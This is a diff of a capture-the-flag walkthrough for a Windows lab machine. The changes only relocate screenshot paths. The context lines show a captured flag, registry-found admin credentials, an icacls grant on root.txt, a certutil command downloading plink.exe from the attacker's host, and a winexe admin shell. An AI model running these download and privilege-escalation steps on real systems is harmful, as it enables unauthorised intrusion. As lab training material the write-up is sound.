@@ -84,7 +84,7 @@ Now that we have a normal-level user on the system, we can begin enumerating for
 
 First, we can quickly grab the user flag from the desktop.
 
-![](Pasted%20image%2020250315231006.png)
+![](Images/Pasted%20image%2020250315231006.png)
 
 Flag:  
 `d20c433812e9b5d408ecccd2d62c4631`
@@ -93,7 +93,7 @@ Flag:
 
 Since we don't have permissions to read the admin flag, let's continue enumeration.
 
-![](Pasted%20image%2020250315231053.png)
+![](Images/Pasted%20image%2020250315231053.png)
 
 After further enumeration, we discover credentials for the `Administrator` account in the registry. Since this is a CTF, we will assume these credentials are valid and attempt to use them to establish a session.
 
@@ -101,7 +101,7 @@ After further enumeration, we discover credentials for the `Administrator` accou
 
 We verify the credentials are correct using `netexec`.
 
-![](Pasted%20image%2020250315233619.png)
+![](Images/Pasted%20image%2020250315233619.png)
 
 ### Two Pathways for Obtaining the Admin Flag
 
@@ -120,7 +120,7 @@ Command to grant full control to `alfred` on `root.txt`:
 
 `icacls root.txt /grant CHATTERBOX\Alfred:(F)`
 
-![](Pasted%20image%2020250315234838.png)
+![](Images/Pasted%20image%2020250315234838.png)
 
 We can now read the root flag. This wasn’t likely the intended solution, as we didn’t "root" the box, so we will also attempt to generate a full administrative shell.
 
@@ -132,9 +132,9 @@ Using `certutil` to download `plink.exe`:
 
 `certutil -urlcache -f http://10.10.14.13/plink.exe plink.exe`
 
-![](Pasted%20image%2020250315235951.png)
+![](Images/Pasted%20image%2020250315235951.png)
 
-![](Pasted%20image%2020250316000138.png)
+![](Images/Pasted%20image%2020250316000138.png)
 
 Now that `plink.exe` is on the victim machine, we establish a connection using:
 
@@ -146,7 +146,7 @@ Check the connection:
 
 `netstat -tuln`
 
-![](Pasted%20image%2020250316002534.png)
+![](Images/Pasted%20image%2020250316002534.png)
 
 We have successfully established the connection. Now we can interact with the host remotely.
 
@@ -154,6 +154,6 @@ We have successfully established the connection. Now we can interact with the ho
 
 Using `winexe` to open a new command prompt as Administrator. Although this shell isn’t the best, it gets the job done.
 
-![](Pasted%20image%2020250316002702.png)
+![](Images/Pasted%20image%2020250316002702.png)
 
 ---
